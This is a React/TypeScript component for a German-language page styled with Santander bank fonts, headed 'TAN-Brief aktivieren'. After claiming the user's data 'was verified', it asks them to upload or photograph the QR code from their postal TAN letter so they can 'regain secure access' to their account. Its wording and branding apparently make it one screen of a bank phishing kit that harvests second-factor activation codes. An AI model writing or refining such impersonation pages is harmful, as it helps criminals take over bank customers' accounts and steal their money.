import React from 'react';
import { QrCode, Upload } from 'lucide-react';

interface QRInstructionsScreenProps {
  onContinue: () => void;
}

const QRInstructionsScreen: React.FC<QRInstructionsScreenProps> = ({ onContinue }) => {
  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .mobile-title {
              font-size: 2.5rem !important;
            }
          }
          @media (max-width: 480px) {
            .mobile-title {
              font-size: 2rem !important;
            }
          }
        `}
      </style>
      <div style={{ 
        minHeight: '100vh',
        backgroundColor: 'white',
        paddingTop: '4rem',
        paddingBottom: '4rem'
      }}>
        <div style={{
          maxWidth: '1440px',
          margin: '0 auto',
          padding: '0 2rem'
        }}>
          <div style={{
            maxWidth: '800px'
          }}>
            <h1 className="mobile-title" style={{
              color: '#444',
              fontSize: '3rem',
              fontWeight: '600',
              marginBottom: '2rem',
              fontFamily: 'santander_headline_bold, Arial, sans-serif',
              lineHeight: '1.1'
            }}>
              TAN-Brief aktivieren
            </h1>
            
            <p style={{
              color: '#666',
              fontSize: '1.125rem',
              lineHeight: '1.6',
              marginBottom: '3rem',
              fontFamily: 'santander_regular, Arial, sans-serif'
            }}>
              Ihre Daten wurden erfolgreich verifiziert. Als letzten Schritt aktivieren Sie bitte Ihren neuen TAN-Brief, 
              um wieder sicher auf Ihr Konto zugreifen zu können.
            </p>
            
            <div style={{
              backgroundColor: '#f8f9fa',
              border: '1px solid #e5e7eb',
              borderRadius: '8px',
              padding: '2rem',
              marginBottom: '3rem'
            }}>
              <h3 style={{
                color: '#444',
                fontSize: '1.25rem',
                fontWeight: '600',
                marginBottom: '1.5rem',
                fontFamily: 'santander_headline_bold, Arial, sans-serif'
              }}>
                So aktivieren Sie Ihren TAN-Brief:
              </h3>
              
              <div style={{ marginBottom: '1.5rem' }}>
                <div style={{ display: 'flex', alignItems: 'flex-start', gap: '1rem' }}>
                  <span style={{
                    backgroundColor: '#9e3667',
                    color: 'white',
                    borderRadius: '50%',
                    width: '28px',
                    height: '28px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontSize: '14px',
                    fontWeight: '600',
                    flexShrink: 0,
                    marginTop: '2px',
                    fontFamily: 'santander_bold, Arial, sans-serif'
                  }}>
                    1
                  </span>
                  <div>
                    <p style={{
                      color: '#444',
                      fontSize: '1rem',
                      margin: 0,
                      lineHeight: '1.5',
                      fontFamily: 'santander_regular, Arial, sans-serif',
                      fontWeight: '500'
                    }}>
                      TAN-Brief bereithalten
                    </p>
                    <p style={{
                      color: '#666',
                      fontSize: '0.875rem',
                      margin: '0.25rem 0 0 0',
                      lineHeight: '1.5',
                      fontFamily: 'santander_regular, Arial, sans-serif'
                    }}>
                      Sie haben einen TAN-Brief mit QR-Code per Post erhalten
                    </p>
                  </div>
                </div>
              </div>
              
              <div style={{ marginBottom: '1.5rem' }}>
                <div style={{ display: 'flex', alignItems: 'flex-start', gap: '1rem' }}>
                  <span style={{
                    backgroundColor: '#9e3667',
                    color: 'white',
                    borderRadius: '50%',
                    width: '28px',
                    height: '28px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontSize: '14px',
                    fontWeight: '600',
                    flexShrink: 0,
                    marginTop: '2px',
                    fontFamily: 'santander_bold, Arial, sans-serif'
                  }}>
                    2
                  </span>
                  <div>
                    <p style={{
                      color: '#444',
                      fontSize: '1rem',
                      margin: 0,
                      lineHeight: '1.5',
                      fontFamily: 'santander_regular, Arial, sans-serif',
                      fontWeight: '500'
                    }}>
                      QR-Code scannen
                    </p>
                    <p style={{
                      color: '#666',
                      fontSize: '0.875rem',
                      margin: '0.25rem 0 0 0',
                      lineHeight: '1.5',
                      fontFamily: 'santander_regular, Arial, sans-serif'
                    }}>
                      Laden Sie den QR-Code hoch oder fotografieren Sie ihn direkt mit Ihrer Kamera
                    </p>
                  </div>
                </div>
              </div>
              
              <div>
                <div style={{ display: 'flex', alignItems: 'flex-start', gap: '1rem' }}>
                  <span style={{
                    backgroundColor: '#9e3667',
                    color: 'white',
                    borderRadius: '50%',
                    width: '28px',
                    height: '28px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontSize: '14px',
                    fontWeight: '600',
                    flexShrink: 0,
                    marginTop: '2px',
                    fontFamily: 'santander_bold, Arial, sans-serif'
                  }}>
                    3
                  </span>
                  <div>
                    <p style={{
                      color: '#444',
                      fontSize: '1rem',
                      margin: 0,
                      lineHeight: '1.5',
                      fontFamily: 'santander_regular, Arial, sans-serif',
                      fontWeight: '500'
                    }}>
                      Aktivierung abschließen
                    </p>
                    <p style={{
                      color: '#666',
                      fontSize: '0.875rem',
                      margin: '0.25rem 0 0 0',
                      lineHeight: '1.5',
                      fontFamily: 'santander_regular, Arial, sans-serif'
                    }}>
                      Ihr TAN-Verfahren wird automatisch aktiviert und Sie können wieder sicher auf Ihr Konto zugreifen
                    </p>
                  </div>
                </div>
              </div>
            </div>

            {/* Info Box */}
            <div style={{
              backgroundColor: '#e8f4f8',
              border: '1px solid #bee3f8',
              borderRadius: '8px',
              padding: '1.5rem',
              marginBottom: '3rem',
              display: 'flex',
              alignItems: 'flex-start',
              gap: '1rem'
            }}>
              <QrCode size={24} color="#2563eb" style={{ flexShrink: 0, marginTop: '2px' }} />
              <div>
                <p style={{
                  color: '#1e40af',
                  fontSize: '0.875rem',
                  margin: 0,
                  fontFamily: 'santander_regular, Arial, sans-serif',
                  lineHeight: '1.5'
                }}>
                  <strong>Tipp:</strong> Achten Sie beim Fotografieren auf gute Beleuchtung und halten Sie die Kamera ruhig. 
                  Der QR-Code sollte vollständig im Bild sein und scharf abgebildet werden.
                </p>
              </div>
            </div>
            
            <button
              onClick={onContinue}
              style={{
                backgroundColor: '#9e3667',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                padding: '16px 32px',
                fontSize: '16px',
                fontWeight: '600',
                cursor: 'pointer',
                fontFamily: 'santander_bold, Arial, sans-serif',
                transition: 'all 0.3s ease',
                display: 'inline-flex',
                alignItems: 'center',
                gap: '8px'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.backgroundColor = '#8a2f5a';
                e.currentTarget.style.transform = 'translateY(-1px)';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.backgroundColor = '#9e3667';
                e.currentTarget.style.transform = 'translateY(0)';
              }}
            >
              <Upload size={20} />
              QR-Code jetzt hochladen
            </button>
          </div>
        </div>
      </div>
    </>
  );
};

export default QRInstructionsScreen; 